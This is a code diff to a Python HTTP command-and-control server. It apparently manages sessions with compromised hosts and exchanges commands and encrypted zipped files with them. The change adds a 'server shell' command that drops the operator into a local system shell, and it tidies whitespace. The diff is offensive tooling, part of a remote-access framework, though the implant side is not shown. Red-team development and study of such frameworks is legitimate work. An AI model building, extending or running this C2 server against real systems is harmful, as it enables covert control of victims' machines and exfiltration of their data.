@@ -6,11 +6,11 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import unquote_plus
 from crypt import cipher
 from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
-    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, INCOMING, OUTGOING, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode, C2Commands
+    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, INCOMING, OUTGOING, RESPONSE_KEY, SHELL, HEADER, PROXY, HTTPStatusCode, C2Commands
 
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from inputimeout import inputimeout, TimeoutOccurred
-from os import mkdir, path, listdir
+from os import mkdir, path, listdir, system
 
 def get_new_session():
     """ This function check if other sessions exists. If none re-initialize variables. However, if sessions do exist,
@@ -96,7 +96,7 @@ class C2Handler(BaseHTTPRequestHandler):
                             else:
                                 print(key, "-", value)
                         print("\nYour active session:", print_last, sep="\n")
-                        
+
                     elif cmd == C2Commands.SERV_CTRL.value: # server control
                         try:
                             possible_new_session = int(cmd.split()[2])
@@ -151,6 +151,10 @@ class C2Handler(BaseHTTPRequestHandler):
                     elif cmd == C2Commands.SERV_EXT.value: # server exit
                         print("The C2 server has been shut down.")
                         server.shutdown()
+                    elif cmd == C2Commands.SERV_SHELL.value: # server shell
+                        print("Type type exit to return to the c2 server's terminal window.")
+                        system(SHELL)
+
                 else:        
                     try:
                         self.http_response(HTTPStatusCode.OK.value)
